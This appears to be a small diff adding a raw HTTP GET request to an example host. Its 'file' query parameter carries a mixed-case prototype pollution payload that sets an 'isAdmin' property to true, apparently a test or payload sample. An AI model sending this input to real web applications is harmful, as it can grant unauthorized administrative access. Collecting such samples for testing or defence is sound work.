@@ -1,0 +1,4 @@
+GET /a?file=__pRoTo__[IsAdMiN]%3DtRuE HTTP/1.1
+Host: demo.example.com
+Connection: close
+
